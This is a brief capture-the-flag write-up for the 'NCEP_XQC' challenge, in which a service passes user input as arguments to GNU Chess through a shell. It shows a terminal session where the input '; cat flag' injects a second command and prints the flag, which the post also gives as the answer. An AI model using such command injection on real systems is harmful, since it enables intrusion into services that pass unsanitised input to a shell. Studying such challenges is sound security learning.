---
title: "OSU League 2020/2021 - NCEP_XQC Writeup"
date: 2021-04-10
draft: false
description: ""
tags: ["ctf"]
---
## Writeup
For this challenge, we are given a simple program that just runs GNU chess.
Right away we can see that it lets us input command line arguments! Maybe we can just do a simple commandline injection to cat the flag:

```
$ nc ctf.ropcity.com 31314
WELCOME TO THE NORWEGIAN COLLEGE OF ELITE PWN
Please enter your custom command line arguments, or just hit enter to begin your training: ; cat flag
executing command: /usr/games/gnuchess -g -m ; cat flag

GNU Chess 6.2.5
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
White (1) : quit
osu{WeLc0m3_T0_tH3_c0LLe6e_0f_pWN}

finished executing command /usr/games/gnuchess -g -m ; cat flag
```

And we get the flag!  
`osu{WeLc0m3_T0_tH3_c0LLe6e_0f_pWN}`

Welp... Looks like that was it. A good beginner challenge for this series!